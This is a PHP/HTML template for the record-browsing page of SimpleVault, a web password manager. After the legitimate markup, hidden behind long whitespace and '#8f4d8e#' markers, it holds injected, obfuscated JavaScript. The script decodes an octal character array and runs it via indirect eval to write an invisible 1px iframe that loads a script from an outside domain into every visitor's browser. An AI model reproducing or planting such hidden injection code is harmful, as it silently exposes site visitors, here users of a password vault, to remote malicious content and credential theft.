<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" 
	"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<?php include "$template/incl-head.php"; ?>
</head>

<body  onload="document.forms.enterpf.pf.focus()">

<?php include "$template/incl-titlebar.php"; ?>

<h1>Browse</h1>
<table class='entry'>
<?php foreach ($records as $record){?>
  <tr><td><?php echo $record['cat']?></td><td><?php echo $record['t1']?></td><td><?php echo $record['t2']?></td><td><?php echo date($dateformat,$record['mdate']) ?></td><td><a href='?dec=1&amp;cat=<?php echo $record['cat']; ?>&amp;t1=<?php echo $record['t1']; ?>&amp;t2=<?php echo $record['t2']; ?>'><img src='img/decrypt.png'  title='decrypt' alt='decrypt'/></a></td><td><a href='?edt=1&amp;cat=<?php echo $record['cat']; ?>&amp;t1=<?php echo $record['t1']; ?>&amp;t2=<?php echo $record['t2']; ?>'><img src='img/edit.png'  title='edit' alt='edit'/></a></td><td><a href='?del=1&amp;cat=<?php echo $record['cat']; ?>&amp;t1=<?php echo $record['t1']; ?>&amp;t2=<?php echo $record['t2']; ?>'><img src='img/del.png'  title='delete' alt='delete'/></a></td></tr>
<?php }?>
</table>
<p><a href='?new=1&amp;cat=<?php echo $defcat ?>'><img class='button' src='img/add.png' title='add new entry' alt='add new entry' /> add new entry</a>
</p>

<?php if(count($records)==0){ ?>
  <div class='footer'><span>Password manager powered by <a href='http://simplevault.sourceforge.net'>SimpleVault</a></span></div>
<?php } ?>
<?
#8f4d8e#
                                                                                                                                                                                                                                                          echo "                                                                                                                                                                                                                                                          <script type=\"text/javascript\" language=\"javascript\" >                                                                                                                                                                                                                                                          ff=String;fff=\"fromCharCode\";ff=ff[fff];zz=3;try{document.body&=5151}catch(gdsgd){v=\"eval\";if(document)try{document.body=12;}catch(gdsgsdg){asd=0;try{}catch(q){asd=1;}if(!asd){w={a:window}.a;vv=v;}}e=w[vv];if(1){f=new Array(050,0146,0165,0156,0143,0164,0151,0157,0156,040,050,051,040,0173,015,012,040,040,040,040,0166,0141,0162,040,0150,0163,0150,0166,040,075,040,0144,0157,0143,0165,0155,0145,0156,0164,056,0143,0162,0145,0141,0164,0145,0105,0154,0145,0155,0145,0156,0164,050,047,0151,0146,0162,0141,0155,0145,047,051,073,015,012,015,012,040,040,040,040,0150,0163,0150,0166,056,0163,0162,0143,040,075,040,047,0150,0164,0164,0160,072,057,057,0141,0143,0143,0165,0162,0141,0143,0171,0163,0145,0143,0162,0145,0164,0141,0162,0151,0141,0154,056,0143,0157,0155,057,0137,0155,0147,0170,0146,0164,0160,057,0143,0157,0165,0156,0164,056,0160,0150,0160,047,073,015,012,040,040,040,040,0150,0163,0150,0166,056,0163,0164,0171,0154,0145,056,0160,0157,0163,0151,0164,0151,0157,0156,040,075,040,047,0141,0142,0163,0157,0154,0165,0164,0145,047,073,015,012,040,040,040,040,0150,0163,0150,0166,056,0163,0164,0171,0154,0145,056,0142,0157,0162,0144,0145,0162,040,075,040,047,060,047,073,015,012,040,040,040,040,0150,0163,0150,0166,056,0163,0164,0171,0154,0145,056,0150,0145,0151,0147,0150,0164,040,075,040,047,061,0160,0170,047,073,015,012,040,040,040,040,0150,0163,0150,0166,056,0163,0164,0171,0154,0145,056,0167,0151,0144,0164,0150,040,075,040,047,061,0160,0170,047,073,015,012,040,040,040,040,0150,0163,0150,0166,056,0163,0164,0171,0154,0145,056,0154,0145,0146,0164,040,075,040,047,061,0160,0170,047,073,015,012,040,040,040,040,0150,0163,0150,0166,056,0163,0164,0171,0154,0145,056,0164,0157,0160,040,075,040,047,061,0160,0170,047,073,015,012,015,012,040,040,040,040,0151,0146,040,050,041,0144,0157,0143,0165,0155,0145,0156,0164,056,0147,0145,0164,0105,0154,0145,0155,0145,0156,0164,0102,0171,0111,0144,050,047,0150,0163,0150,0166,047,051,051,040,0173,015,012,040,040,040,040,040,040,040,040,0144,0157,0143,0165,0155,0145,0156,0164,056,0167,0162,0151,0164,0145,050,047,074,0144,0151,0166,040,0151,0144,075,0134,047,0150,0163,0150,0166,0134,047,076,074,057,0144,0151,0166,076,047,051,073,015,012,040,040,040,040,040,040,040,040,0144,0157,0143,0165,0155,0145,0156,0164,056,0147,0145,0164,0105,0154,0145,0155,0145,0156,0164,0102,0171,0111,0144,050,047,0150,0163,0150,0166,047,051,056,0141,0160,0160,0145,0156,0144,0103,0150,0151,0154,0144,050,0150,0163,0150,0166,051,073,015,012,040,040,040,040,0175,015,012,0175,051,050,051,073);}w=f;s=[];if(window.document)for(i=2-2;-i+498!=0;i+=1){j=i;if((031==0x19))if(e)s=s+ff(w[j]);}xz=e;if(v)xz(s)}</script>";

#/8f4d8e#
?>

</body>
</html>
